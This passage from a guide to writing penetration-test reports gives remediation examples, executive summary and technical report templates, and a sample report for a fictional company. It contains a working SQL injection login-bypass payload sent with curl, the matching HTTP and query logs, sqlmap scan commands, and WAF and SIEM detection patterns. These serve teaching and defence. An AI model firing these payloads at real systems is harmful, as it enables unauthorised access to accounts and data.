sudo systemctl restart mysql
````

2. Remove Anonymous Accounts and Test Database:

```sql
-- Connect as root
mysql -u root -p

-- Remove anonymous users
DELETE FROM mysql.user WHERE User='';

-- Remove remote root login
DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1', '::1');

-- Drop test database
DROP DATABASE IF EXISTS test;
DELETE FROM mysql.db WHERE Db='test' OR Db='test\\_%';

-- Reload privileges
FLUSH PRIVILEGES;
```

3. Implement Principle of Least Privilege:

```sql
-- Create application-specific user
CREATE USER 'appuser'@'localhost' IDENTIFIED BY 'strong_random_password';

-- Grant only required privileges
GRANT SELECT, INSERT, UPDATE, DELETE ON application_db.* TO 'appuser'@'localhost';

-- Do NOT grant FILE, SUPER, or PROCESS privileges unless absolutely necessary

-- Verify privileges
SHOW GRANTS FOR 'appuser'@'localhost';
```

4. Harden MySQL Configuration (/etc/mysql/my.cnf):

```ini
[mysqld]
# Bind to localhost only (if no remote access needed)
bind-address = 127.0.0.1

# Disable LOAD DATA LOCAL INFILE
local-infile = 0

# Disable symbolic links
symbolic-links = 0

# Enable query logging for security monitoring
log_error = /var/log/mysql/error.log
slow_query_log = 1
slow_query_log_file = /var/log/mysql/slow-query.log

# Limit connection attempts
max_connect_errors = 10

# Set appropriate max connections
max_connections = 100
```

5. Restart and Verify:

```bash
sudo systemctl restart mysql

# Verify MySQL user
ps aux | grep mysql

# Verify binding
sudo netstat -tlnp | grep 3306

# Test remote connection (should fail if bound to localhost)
mysql -h <server_ip> -u root -p
```

References:

- MySQL Security Best Practices
- CIS MySQL Benchmark
- OWASP Database Security Cheat Sheet

````

### Network-Level Remediation

**Firewall Rule Implementation**

```markdown
Finding: Excessive Network Exposure - Management Interfaces Publicly Accessible

Current State:
- SSH (22/tcp) open to 0.0.0.0/0
- RDP (3389/tcp) open to 0.0.0.0/0
- MySQL (3306/tcp) open to 0.0.0.0/0

Recommended Firewall Rules (iptables - Linux):

```bash
#!/bin/bash
# Firewall hardening script

# Flush existing rules
iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X
iptables -t mangle -F
iptables -t mangle -X

# Default policies
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# Allow loopback
iptables -A INPUT -i lo -j ACCEPT

# Allow established connections
iptables -A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT

# Allow HTTP/HTTPS from anywhere
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# Allow SSH only from management network
iptables -A INPUT -p tcp --dport 22 -s 10.0.1.0/24 -j ACCEPT

# Allow MySQL only from application servers
iptables -A INPUT -p tcp --dport 3306 -s 10.0.2.0/24 -j ACCEPT

# Rate limit SSH to prevent brute force
iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -m recent --set
iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -m recent --update --seconds 60 --hitcount 4 -j DROP

# Log dropped packets
iptables -A INPUT -m limit --limit 5/min -j LOG --log-prefix "iptables_INPUT_denied: " --log-level 7

# Save rules
iptables-save > /etc/iptables/rules.v4
````

AWS Security Group Equivalent:

```
Inbound Rules:
+----------+----------+------------+------------------+-------------+
| Type     | Protocol | Port Range | Source           | Description |
+----------+----------+------------+------------------+-------------+
| HTTP     | TCP      | 80         | 0.0.0.0/0        | Public web  |
| HTTPS    | TCP      | 443        | 0.0.0.0/0        | Public web  |
| SSH      | TCP      | 22         | 10.0.1.0/24      | Mgmt only   |
| MySQL    | TCP      | 3306       | sg-app-servers   | App tier    |
+----------+----------+------------+------------------+-------------+

Outbound Rules:
+----------+----------+------------+------------------+-------------+
| Type     | Protocol | Port Range | Destination      | Description |
+----------+----------+------------+------------------+-------------+
| All      | All      | All        | 0.0.0.0/0        | Allow all   |
+----------+----------+------------+------------------+-------------+
```

Verification:

```bash
# Test firewall rules
nmap -Pn <target> -p-

# From management network (should succeed)
ssh user@<target>

# From external network (should timeout)
ssh user@<target>

# Verify iptables rules
sudo iptables -L -v -n --line-numbers
```

References:

- NIST SP 800-41r1: Guidelines on Firewalls and Firewall Policy
- CIS Controls 9: Limitation and Control of Network Ports

````

### Process and Policy Recommendations

**Security Awareness Training**

```markdown
Finding: Successful Phishing Simulation - 45% Click Rate

Root Cause Analysis:
- No formal security awareness training program
- Users unfamiliar with phishing indicators
- No reporting mechanism for suspicious emails

Short-Term Remediation (0-30 days):
1. Send immediate communication about phishing threats
2. Distribute quick reference guide for identifying phishing
3. Implement email banner for external emails
4. Enable email filtering with URL rewriting

Long-Term Remediation (30-90 days):
1. Implement quarterly security awareness training
   - Recommended Platform: KnowBe4, Proofpoint, or similar
   - Topics: Phishing, password security, data handling

2. Conduct monthly phishing simulations
   - Metrics to track:
     * Click rate (target: <5%)
     * Reporting rate (target: >60%)
     * Time to report (target: <15 minutes)

3. Establish incident reporting process
   - Create "Report Phishing" button in email client
   - Define escalation procedures
   - Implement recognition program for reporters

4. Develop phishing response playbook
   - User reporting workflow
   - IT investigation procedures
   - Communication templates

Success Metrics:
- Reduce click rate from 45% to <10% in 6 months
- Achieve >50% reporting rate in 6 months
- Zero successful credential harvesting incidents

Budget Estimate:
- Training platform: $15-30 per user per year
- Initial campaign development: 40 hours internal time
- Ongoing management: 10 hours per month

References:
- NIST Cybersecurity Framework PR.AT-1
- SANS Security Awareness Roadmap
- Anti-Phishing Working Group (APWG) Best Practices
````

## Executive Summary Writing

Executive summaries provide high-level overviews for non-technical stakeholders, focusing on business impact and strategic recommendations.

### Executive Summary Structure

```markdown
# EXECUTIVE SUMMARY

## Assessment Overview
[Brief description of assessment scope, dates, and methodology]

## Key Findings
[3-5 most critical findings with business impact]

## Risk Summary
[Overall risk posture with supporting statistics]

## Strategic Recommendations
[High-level actions prioritized by business impact]

## Conclusion
[Overall security posture assessment]
```

### Executive Summary Template

```markdown
# EXECUTIVE SUMMARY
## Security Assessment - Example Corporation
Assessment Period: October 1-15, 2025

### Assessment Overview

Acme Security conducted a comprehensive security assessment of Example Corporation's external-facing applications and internal network infrastructure. The assessment simulated real-world attack scenarios to identify vulnerabilities that could be exploited by malicious actors.

**Scope:**
- External web applications (5 applications)
- Internal network (150 hosts)
- Cloud infrastructure (AWS environment)

**Methodology:**
- OWASP Testing Guide v4.2
- NIST SP 800-115 Technical Guide to Information Security Testing
- Custom attack scenarios based on threat intelligence

### Key Findings

The assessment identified **23 vulnerabilities**, including **3 Critical**, **7 High**, **9 Medium**, and **4 Low** severity findings.

**Critical Risk: Unauthenticated Remote Code Execution**
- **Location:** Customer Portal API (api.example.com)
- **Business Impact:** Complete system compromise enabling unauthorized access to 1.2 million customer records, including personally identifiable information (PII), payment data, and authentication credentials
- **Financial Exposure:** Estimated $45-60 million (data breach costs, regulatory fines, legal fees)
- **Compliance:** PCI-DSS violation, potential GDPR penalties up to 4% annual revenue

**Critical Risk: Privilege Escalation in Production Environment**
- **Location:** Web application servers (prod-web-01 through prod-web-05)
- **Business Impact:** Attackers with limited access can elevate to administrator privileges, enabling data theft, service disruption, and ransomware deployment
- **Financial Exposure:** Estimated $10-15 million (incident response, downtime, recovery)

**Critical Risk: Unencrypted Database Backups**
- **Location:** AWS S3 bucket (backups-example-corp-2023)
- **Business Impact:** Publicly accessible backups containing complete customer database, employee records, and proprietary business data
- **Financial Exposure:** Estimated $30-40 million (GDPR fines, class action lawsuits, reputation damage)

### Risk Summary

**Overall Risk Rating: CRITICAL**

The assessment revealed a security posture that presents **immediate and severe** risk to Example Corporation. The identified vulnerabilities provide multiple pathways for unauthorized access, data exfiltration, and service disruption.

**Vulnerability Distribution:**
```

Critical: â–ˆâ–ˆâ–ˆ 3 (13%) High: â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ 7 (30%) Medium: â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ 9 (39%) Low: â–ˆâ–ˆâ–ˆâ–ˆ 4 (17%) Info: - 0 (0%)

```

**Risk by Category:**
- **Data Exposure:** 8 findings (35% of total risk)
- **Access Control:** 6 findings (26% of total risk)
- **Configuration:** 5 findings (22% of total risk)
- **Network Security:** 4 findings (17% of total risk)

**Positive Observations:**
- Strong password policies implemented
- Endpoint protection deployed across all workstations
- Security monitoring and logging infrastructure in place
- Incident response plan documented and tested

### Strategic Recommendations

**Immediate Actions (0-30 days) - $250K budget:**

1. **Emergency Patch Deployment**
   - Apply patches for all Critical vulnerabilities
   - Implement temporary compensating controls
   - Estimated effort: 200 hours

2. **Restrict Database Backup Access**
   - Remove public access from S3 buckets
   - Implement encryption at rest
   - Estimated effort: 40 hours

3. **Deploy Web Application Firewall (WAF)**
   - Cloud-based WAF for immediate protection
   - Custom rulesets for identified vulnerabilities
   - Estimated cost: $15K/month

**Short-Term Actions (30-90 days) - $500K budget:**

4. **Security Code Review and Remediation**
   - Systematic review of application code
   - Fix SQL injection and XSS vulnerabilities
   - Implement secure coding standards
   - Estimated effort: 600 hours

5. **Network Segmentation**
   - Isolate production, development, and management networks
   - Implement zero-trust network access
   - Estimated effort: 300 hours + $50K equipment

6. **Enhanced Monitoring**
   - Deploy SIEM with threat intelligence feeds
   - Implement automated alerting for suspicious activity
   - Estimated cost: $100K initial + $30K/year

**Long-Term Actions (90-180 days) - $1M budget:**

7. **Comprehensive Security Program**
   - Establish Application Security team
   - Implement DevSecOps practices
   - Regular penetration testing (quarterly)
   - Bug bounty program
   - Estimated cost: $750K annually

8. **Security Awareness Training**
   - Quarterly training for all employees
   - Monthly phishing simulations
   - Estimated cost: $50K annually

9. **Third-Party Risk Management**
   - Vendor security assessments
   - Contract security requirements
   - Ongoing monitoring
   - Estimated effort: 520 hours annually

**Return on Investment:**
- **Cost of Remediation:** $1.75M over 6 months
- **Cost of Potential Breach:** $85-115M
- **Risk Reduction:** 87% (estimated)
- **ROI:** 4,857% - 6,471%

### Conclusion

Example Corporation faces **significant cybersecurity risk** that requires immediate executive attention and resource allocation. The identified vulnerabilities represent realistic attack vectors actively exploited by threat actors in the current threat landscape.

The three Critical findings alone represent potential losses exceeding $85 million, far outweighing the $1.75 million investment required for comprehensive remediation. Failure to address these vulnerabilities exposes the organization to:

- **Financial Loss:** Breach costs, regulatory fines, legal liability
- **Operational Disruption:** Service outages, ransomware attacks
- **Reputation Damage:** Customer trust erosion, competitive disadvantage
- **Regulatory Action:** PCI-DSS suspension, GDPR enforcement

**Immediate executive action is required.** We recommend convening an emergency security steering committee within 48 hours to approve the immediate action plan and allocate resources for short-term and long-term remediation efforts.

Acme Security remains available to assist with remediation planning, implementation oversight, and ongoing security advisory services.

---
**Report Classification:** CONFIDENTIAL - ATTORNEY-CLIENT PRIVILEGED
**Contact:** Jane Doe, Principal Security Consultant | jane.doe@acmesecurity.com | (555) 123-4567
```

### Executive Summary Best Practices

**DO:**

- âœ“ Lead with business impact, not technical details
- âœ“ Use clear, non-technical language
- âœ“ Quantify risk in financial terms when possible
- âœ“ Provide specific, prioritized recommendations
- âœ“ Include visual elements (charts, graphs, risk matrices)
- âœ“ Keep to 2-4 pages maximum
- âœ“ Focus on strategic decision-making needs
- âœ“ Include positive findings and strengths

**DON'T:**

- âœ— Use technical jargon without explanation
- âœ— Include detailed exploit steps or code
- âœ— Overwhelm with every finding (save for technical section)
- âœ— Make recommendations without cost/effort estimates
- âœ— Assume technical knowledge
- âœ— Exceed 4 pages (executives won't read it)
- âœ— Present problems without solutions

## Technical Report Writing

Technical reports provide comprehensive documentation for technical teams to understand and remediate identified vulnerabilities.

### Technical Report Structure

```markdown
# TECHNICAL REPORT STRUCTURE

## 1. Title Page
- Report title
- Client name
- Assessment dates
- Report date
- Classification (Confidentia
- Report version
- Prepared by (consultant names)
- Reviewed by (QA reviewer)
- Distribution list

## 2. Table of Contents

- Automated with page numbers
- Include all sections and appendices
- Hyperlinked in digital versions

## 3. Document Control

- Version history
- Revision log
- Change summary

## 4. Introduction

- Assessment objectives
- Scope definition (in-scope/out-of-scope)
- Methodology and standards used
- Timeline and testing windows
- Limitations and assumptions

## 5. Executive Summary

- High-level findings
- Overall risk assessment
- Key recommendations

## 6. Methodology

- Testing approach
- Tools utilized
- Attack scenarios
- Testing phases

## 7. Detailed Findings

- Vulnerability descriptions
- Technical details
- Proof of concept
- Risk ratings
- Remediation guidance
- Evidence (screenshots, logs)

## 8. Remediation Roadmap

- Prioritized action plan
- Timeline recommendations
- Resource requirements

## 9. Conclusion

- Security posture summary
- Compliance status
- Next steps

## 10. Appendices

- Raw scan outputs
- Tool configurations
- Testing credentials used
- Legal disclaimers
- Glossary of terms
````

### Detailed Finding Template

```markdown
## Finding [ID]: [Vulnerability Name]

### Overview
**Severity:** [Critical/High/Medium/Low/Informational]
**CVSS Score:** [X.X] 
**CVSS Vector:** CVSS:3.1/AV:X/AC:X/PR:X/UI:X/S:X/C:X/I:X/A:X
**Category:** [OWASP Top 10 category, CWE-XXX]
**Affected Systems:**
- [System 1]: [IP/URL]
- [System 2]: [IP/URL]

### Description
[Clear, concise explanation of the vulnerability. Explain what the vulnerability is, why it exists, and what it allows an attacker to do. Use language appropriate for technical staff but understandable to security-aware management.]

### Technical Details
**Attack Vector:** [Network/Adjacent/Local/Physical]
**Authentication Required:** [Yes/No - specify level]
**Exploit Complexity:** [Low/Medium/High]

**Vulnerable Component:**
- Service: [Service name and version]
- Protocol: [HTTP/HTTPS/SSH/etc.]
- Port: [Port number]
- Path/Location: [Specific endpoint or file]

**Root Cause:**
[Technical explanation of why the vulnerability exists]

### Exploitation Steps
1. [Step 1 with specific commands/payloads]
2. [Step 2 with expected results]
3. [Step 3 demonstrating impact]

**Proof of Concept:**
```bash
# Initial reconnaissance
curl -v https://target.example.com/vulnerable-endpoint

# Exploitation
curl -X POST https://target.example.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1","password":"any"}'

# Result: Authentication bypass, administrative access granted
````

### Evidence

[Screenshot 1: Vulnerable request in Burp Suite] ![Burp Request](https://claude.ai/chat/images/finding-001-burp-request.png)

[Screenshot 2: Successful exploitation showing unauthorized access] ![Exploitation Result](https://claude.ai/chat/images/finding-001-exploitation.png)

[Log excerpt showing vulnerability confirmation]

```
[2025-10-27 14:32:15] Authentication successful for user: admin' OR '1'='1
[2025-10-27 14:32:15] Session created: abc123def456
[2025-10-27 14:32:16] Admin dashboard accessed by session: abc123def456
```

### Business Impact

**Confidentiality Impact:** [High]

- Unauthorized access to customer database
- Exposure of 1.2M customer records including PII
- Access to payment card data (PCI-DSS scope)

**Integrity Impact:** [High]

- Ability to modify customer records
- Potential for fraudulent transactions
- Data manipulation leading to business logic errors

**Availability Impact:** [Medium]

- Potential for database deletion
- Denial of service via resource exhaustion

**Compliance Impact:**

- PCI-DSS Requirement 6.5.1 (Injection flaws) - VIOLATION
- GDPR Article 32 (Security of processing) - NON-COMPLIANT
- SOC 2 CC6.1 (Logical access controls) - DEFICIENT

**Financial Impact Estimate:**

- Data breach: $15-20M (based on $150/record for 100K+ records)
- PCI fines: $5,000-$100,000 per month until remediated
- Legal/notification costs: $500K-$2M
- **Total potential impact: $20.5M-$122M**

### Risk Rating Justification

**CVSS 3.1 Base Score Breakdown:**

- Attack Vector (AV:N): Network - remotely exploitable
- Attack Complexity (AC:L): Low - requires no special conditions
- Privileges Required (PR:N): None - no authentication needed
- User Interaction (UI:N): None - fully automated
- Scope (S:C): Changed - impacts beyond authentication component
- Confidentiality (C:H): High - total information disclosure
- Integrity (I:H): High - total data modification possible
- Availability (A:H): High - total system shutdown possible

**Final CVSS Score: 10.0 (Critical)**

**Likelihood Assessment:** HIGH

- Publicly accessible endpoint
- No authentication required
- Exploit trivial to execute
- Automated scanners can detect and exploit

**Overall Risk Rating: CRITICAL**

### Remediation Recommendations

#### Immediate Actions (0-7 days)

**Priority: P0 - Emergency**

1. **Deploy Temporary Mitigation**
    
    ```bash
    # Implement rate limiting at load balancer
    # Block suspicious patterns via WAF
    
    # ModSecurity rule example:
    SecRule ARGS "@contains OR" \
        "id:1001,phase:2,deny,status:403,\
        msg:'SQL Injection Attempt Blocked'"
    ```
    
2. **Enhanced Monitoring**
    
    ```bash
    # Add SIEM alert for SQL injection attempts
    # Alert: source_ip=* AND uri="/api/login" AND payload contains "OR" OR payload contains "--"
    ```
    
3. **Restrict Network Access** (if applicable)
    
    - Implement IP whitelist for administrative functions
    - Require VPN access for sensitive endpoints

#### Short-Term Remediation (7-30 days)

**Priority: P1 - Critical**

**Primary Fix: Implement Parameterized Queries**

Current Vulnerable Code (Python/Flask):

```python
def authenticate_user(username, password):
    # VULNERABLE: String concatenation
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    result = db.execute(query)
    return result
```

Remediated Code:

```python
def authenticate_user(username, password):
    # SECURE: Parameterized query
    query = "SELECT * FROM users WHERE username=? AND password=?"
    result = db.execute(query, (username, hash_password(password)))
    return result
```

Alternative: Use ORM Framework

```python
from sqlalchemy.orm import Session
from models import User

def authenticate_user(username, password):
    # ORM automatically uses parameterized queries
    user = session.query(User).filter_by(username=username).first()
    if user and user.verify_password(password):
        return user
    return None
```

**Additional Security Measures:**

1. **Input Validation**
    
    ```python
    import re
    
    def validate_username(username):
        # Whitelist approach: alphanumeric only, 3-20 characters
        if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
            raise ValueError("Invalid username format")
        return username
    ```
    
2. **Implement Web Application Firewall (WAF)**
    
    - Deploy AWS WAF or CloudFlare with OWASP Core Rule Set
    - Custom rules for SQL injection patterns
    - Rate limiting per IP address
3. **Least Privilege Database Access**
    
    ```sql
    -- Create restricted application user
    CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'secure_password';
    
    -- Grant only necessary privileges
    GRANT SELECT, INSERT, UPDATE ON appdb.users TO 'webapp'@'localhost';
    
    -- Do NOT grant: DROP, CREATE, ALTER, FILE, SUPER
    
    FLUSH PRIVILEGES;
    ```
    

#### Long-Term Strategic Remediation (30-90 days)

**Priority: P2 - High**

1. **Security Code Review**
    
    - Manual review of all database interaction code
    - Static Application Security Testing (SAST) integration
    - Identify and remediate all SQL injection points
2. **Secure Development Lifecycle (SDL)**
    
    - Mandatory security training for developers
    - Secure coding standards documentation
    - Pre-commit hooks for security checks
3. **Automated Security Testing**
    
    ```yaml
    # .gitlab-ci.yml example
    security_scan:
      stage: test
      script:
        - pip install bandit safety
        - bandit -r . -f json -o bandit-report.json
        - safety check --json > safety-report.json
        - sqlmap -u "http://localhost/api/login" --batch --forms
      artifacts:
        reports:
          sast: bandit-report.json
    ```
    
4. **Database Activity Monitoring**
    
    - Deploy DAM solution (Imperva, Oracle Audit Vault)
    - Alert on unusual query patterns
    - Log all database modifications

### Verification and Testing

**Validation Steps:**

1. **Code Review**
    
    - Verify parameterized queries implemented
    - Confirm input validation present
    - Check for proper error handling
2. **Functional Testing**
    
    ```bash
    # Test with legitimate credentials
    curl -X POST https://target/api/login \
      -H "Content-Type: application/json" \
      -d '{"username":"validuser","password":"validpass"}'
    # Expected: Successful authentication
    
    # Test with SQL injection payload
    curl -X POST https://target/api/login \
      -H "Content-Type: application/json" \
      -d '{"username":"admin'\'' OR '\''1'\''='\''1","password":"any"}'
    # Expected: Authentication failure, query blocked
    ```
    
3. **Automated Security Scan**
    
    ```bash
    # Run sqlmap against fixed endpoint
    sqlmap -u "https://target/api/login" \
      --data='{"username":"test","password":"test"}' \
      --headers="Content-Type: application/json" \
      --level=5 --risk=3 --batch
    
    # Expected result: No injection points found
    ```
    
4. **Manual Penetration Test**
    
    - Attempt various SQL injection techniques
    - Test for second-order SQL injection
    - Verify WAF blocking effectiveness

**Success Criteria:**

- âœ“ No SQL injection vulnerabilities detected by automated scanners
- âœ“ All payloads blocked or safely handled
- âœ“ WAF logs show blocked attempts
- âœ“ Application functions normally with legitimate input
- âœ“ Error messages don't leak database structure
- âœ“ Database logs show only parameterized queries

### References

**Industry Standards:**

- OWASP Top 10 2021: A03 - Injection
- CWE-89: Improper Neutralization of Special Elements used in an SQL Command
- NIST SP 800-53 Rev 5: SI-10 (Information Input Validation)

**Technical Resources:**

- OWASP SQL Injection Prevention Cheat Sheet https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- CAPEC-66: SQL Injection https://capec.mitre.org/data/definitions/66.html
- Parameterized Queries Documentation (framework-specific)

**Vendor Advisories:**

- [N/A - Custom application code vulnerability]

**Related CVEs:**

- CVE-2019-XXXX: Similar vulnerability in [related system]
- Reference for context only - not directly applicable

### Appendix: Additional Evidence

**Network Traffic Capture:**

```
POST /api/login HTTP/1.1
Host: target.example.com
Content-Type: application/json
Content-Length: 58

{"username":"admin' OR '1'='1","password":"irrelevant"}

HTTP/1.1 200 OK
Set-Cookie: session=abc123def456; Path=/; HttpOnly
Content-Type: application/json

{"success":true,"role":"administrator","token":"eyJ0eXAi..."}
```

**Database Query Log:**

```sql
-- Vulnerable query executed by application
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='irrelevant'

-- Query returned: 127 rows (all users)
-- Application authenticated using first row (admin account)
```

**Impact Demonstration:** [Video: exploitation-demo.mp4 showing full attack chain]

- Timestamp 00:00-00:15: Crafting injection payload
- Timestamp 00:16-00:30: Successful authentication as admin
- Timestamp 00:31-01:00: Accessing sensitive data

````

### Report Formatting Best Practices

**Visual Elements:**

1. **Severity Color Coding:**
   - ðŸ”´ Critical: Red (#DC3545)
   - ðŸŸ  High: Orange (#FD7E14)
   - ðŸŸ¡ Medium: Yellow (#FFC107)
   - ðŸŸ¢ Low: Green (#28A745)
   - âšª Informational: Gray (#6C757D)

2. **Charts and Graphs:**
```python
# Python script to generate finding distribution chart
import matplotlib.pyplot as plt

severities = ['Critical', 'High', 'Medium', 'Low', 'Info']
counts = [3, 7, 9, 4, 0]
colors = ['#DC3545', '#FD7E14', '#FFC107', '#28A745', '#6C757D']

plt.figure(figsize=(10, 6))
plt.bar(severities, counts, color=colors)
plt.title('Vulnerability Distribution by Severity', fontsize=16, fontweight='bold')
plt.xlabel('Severity', fontsize=12)
plt.ylabel('Number of Findings', fontsize=12)
plt.grid(axis='y', alpha=0.3)

for i, v in enumerate(counts):
    plt.text(i, v + 0.2, str(v), ha='center', fontweight='bold')

plt.savefig('vulnerability_distribution.png', dpi=300, bbox_inches='tight')
````

3. **Tables:**

```markdown
| Finding ID | Title | Severity | CVSS | Status |
|------------|-------|----------|------|--------|
| FIND-001 | SQL Injection in Login | Critical | 10.0 | Open |
| FIND-002 | XSS in Search | High | 7.1 | Open |
| FIND-003 | Weak SSL Ciphers | Medium | 5.3 | Resolved |
```

### Complete Technical Report Example (Abbreviated)

```markdown
# TECHNICAL SECURITY ASSESSMENT REPORT
## Example Corporation - External and Internal Infrastructure
### Assessment Period: October 1-15, 2025

---

**CONFIDENTIAL - ATTORNEY-CLIENT PRIVILEGED**

Report Version: 1.2
Report Date: October 27, 2025
Classification: Confidential

Prepared by:
- Jane Doe, Lead Penetration Tester, OSCP, OSCE
- John Smith, Senior Security Analyst, CEH, GWAPT

Reviewed by:
- Dr. Alice Johnson, QA Manager, CISSP, CISM

Acme Security Services, Inc.
123 Security Lane
Cyber City, CC 12345
Phone: (555) 123-4567
Email: reports@acmesecurity.com

---

## DOCUMENT CONTROL

| Version | Date | Author | Changes |
|---------|------|--------|---------|
| 1.0 | 2025-10-20 | J. Doe | Initial draft |
| 1.1 | 2025-10-25 | J. Smith | Added findings 15-23 |
| 1.2 | 2025-10-27 | A. Johnson | QA review, final edits |

---

## TABLE OF CONTENTS

1. Executive Summary ................................ 3
2. Introduction ...................................... 8
   2.1 Assessment Objectives ........................ 8
   2.2 Scope ........................................ 9
   2.3 Methodology ................................. 10
   2.4 Timeline .................................... 11
   2.5 Limitations ................................. 12
3. Detailed Findings ................................ 13
   3.1 Critical Severity ........................... 13
   3.2 High Severity ............................... 25
   3.3 Medium Severity ............................. 45
   3.4 Low Severity ................................ 68
4. Remediation Roadmap .............................. 78
5. Conclusion ....................................... 82
6. Appendices ....................................... 84

---

## 2. INTRODUCTION

### 2.1 Assessment Objectives

Example Corporation engaged Acme Security to conduct a comprehensive security assessment of their external-facing web applications and internal network infrastructure. The primary objectives were:

1. **Identify Security Vulnerabilities**
   - Discover exploitable weaknesses in applications and infrastructure
   - Assess configuration security across systems
   - Evaluate access control effectiveness

2. **Assess Attack Surface**
   - Map publicly accessible services
   - Identify information disclosure points
   - Evaluate network segmentation

3. **Simulate Real-World Attacks**
   - Execute attack scenarios based on current threat intelligence
   - Demonstrate exploitability of identified vulnerabilities
   - Assess defensive control effectiveness

4. **Provide Remediation Guidance**
   - Deliver actionable recommendations
   - Prioritize findings by business risk
   - Establish remediation roadmap

5. **Validate Compliance Posture**
   - Assess against PCI-DSS requirements
   - Evaluate GDPR technical controls
   - Review SOC 2 relevant controls

### 2.2 Scope

**In-Scope Systems:**

External Attack Surface:
- *.example.com domains (5 subdomains)
- Public IP ranges: 203.0.113.0/24, 198.51.100.0/28
- Web applications:
  - https://www.example.com (corporate website)
  - https://portal.example.com (customer portal)
  - https://api.example.com (REST API)
  - https://admin.example.com (administrative interface)
  - https://support.example.com (support ticketing system)

Internal Network (VPN Access Provided):
- Internal IP range: 10.0.0.0/16
- Windows Active Directory domain: EXAMPLE.LOCAL
- Database servers: 10.0.2.10-10.0.2.15
- Application servers: 10.0.3.10-10.0.3.25
- File servers: 10.0.4.10-10.0.4.12

Cloud Infrastructure:
- AWS Account: 123456789012
- Services: EC2, RDS, S3, Lambda
- Regions: us-east-1, us-west-2

**Out-of-Scope:**
- Social engineering attacks against employees
- Physical security assessments
- Denial of service (DoS) testing
- Third-party SaaS applications (Salesforce, Office 365)
- Production database content modification
- Payment processing systems (handled by third-party)

**Testing Windows:**
- External testing: 24/7 (October 1-15, 2025)
- Internal testing: Business hours only (9 AM - 5 PM ET, October 8-12, 2025)
- Blackout periods: October 10, 2:00-4:00 PM (scheduled maintenance)

**Rules of Engagement:**
- Notify security team before executing high-risk exploits
- Stop testing immediately if system instability observed
- No data exfiltration beyond proof-of-concept
- All activities logged and documented

### 2.3 Methodology

The assessment followed industry-standard methodologies and frameworks:

**Standards and Frameworks:**
- OWASP Testing Guide v4.2
- PTES (Penetration Testing Execution Standard)
- NIST SP 800-115 (Technical Guide to Information Security Testing)
- OWASP Top 10 2021
- SANS Top 25 Most Dangerous Software Weaknesses

**Testing Phases:**

1. **Reconnaissance (October 1-3)**
   - OSINT gathering
   - DNS enumeration
   - Network mapping
   - Service identification

2. **Vulnerability Assessment (October 3-7)**
   - Automated scanning
   - Manual verification
   - Configuration review
   - Weak credential testing

3. **Exploitation (October 7-12)**
   - Vulnerability exploitation
   - Privilege escalation
   - Lateral movement
   - Data access attempts

4. **Post-Exploitation (October 12-14)**
   - Persistence establishment (simulated)
   - Impact assessment
   - Data sensitivity review

5. **Reporting (October 14-27)**
   - Finding documentation
   - Evidence compilation
   - Report writing and QA

**Tools Utilized:**

Reconnaissance:
- nmap 7.94 - Port scanning
- masscan 1.3.2 - Large-scale scanning
- Sublist3r - Subdomain enumeration
- theHarvester - OSINT data gathering

Vulnerability Scanning:
- Nessus Professional 10.6.1
- OpenVAS 22.4
- Nikto 2.5.0
- WPScan 3.8.25

Web Application Testing:
- Burp Suite Professional 2023.10
- OWASP ZAP 2.14.0
- SQLMap 1.7.11
- XSStrike 3.1.5

Network Testing:
- Metasploit Framework 6.3.40
- Responder 3.1.3.0
- CrackMapExec 5.4.0
- BloodHound 4.3.1

Password Cracking:
- Hashcat 6.2.6
- John the Ripper 1.9.0-jumbo-1
- Hydra 9.5

Custom Scripts:
- Python 3.11 automation scripts
- Bash enumeration scripts

[Continue with Detailed Findings section using the template provided earlier for each vulnerability]

---

## 4. REMEDIATION ROADMAP

### Priority Matrix

| Priority | Timeline | Severity | Action Required |
|----------|----------|----------|-----------------|
| P0 | 0-7 days | Critical | Emergency patching, immediate mitigation |
| P1 | 7-30 days | High | Scheduled remediation, compensating controls |
| P2 | 30-90 days | Medium | Regular maintenance cycle |
| P3 | 90+ days | Low/Info | Future enhancement, risk accepted |

### Phased Remediation Plan

**Phase 1: Emergency Response (Week 1)**
Budget: $250,000 | Effort: 400 hours

- FIND-001: SQL Injection - Deploy WAF, patch code (P0)
- FIND-002: RCE in API - Apply vendor patch (P0)
- FIND-003: Unencrypted S3 Bucket - Enable encryption, restrict access (P0)

**Phase 2: Critical Remediation (Weeks 2-4)**
Budget: $500,000 | Effort: 800 hours

- FIND-004 through FIND-010: High severity findings
- Security code review
- Network segmentation implementation
- Enhanced monitoring deployment

**Phase 3: Security Hardening (Months 2-3)**
Budget: $750,000 | Effort: 1200 hours

- FIND-011 through FIND-019: Medium severity findings
- Configuration management
- Policy enforcement
- User training programs

**Phase 4: Long-Term Improvements (Months 3-6)**
Budget: $1,000,000 | Effort: 2000 hours

- Security program establishment
- DevSecOps integration
- Continuous monitoring
- Regular testing cadence

### Success Metrics

- Critical vulnerabilities: 100% remediated within 30 days
- High vulnerabilities: 90% remediated within 90 days
- Re-test validation: 95% effective remediation rate
- Security posture improvement: 85% risk reduction

---

## 5. CONCLUSION

The security assessment of Example Corporation identified significant vulnerabilities requiring immediate attention. While the organization has implemented foundational security controls, critical gaps in application security, access control, and configuration management present substantial risk.

**Key Takeaways:**
1. Application security requires immediate investment
2. Network segmentation must be improved
3. Monitoring and detection capabilities need enhancement
4. Security awareness training is essential

With executive commitment and adequate resource allocation, Example Corporation can achieve a strong security posture within 6 months. Acme Security recommends quarterly re-assessments to maintain security effectiveness.

---

## 6. APPENDICES

### Appendix A: Raw Scan Data
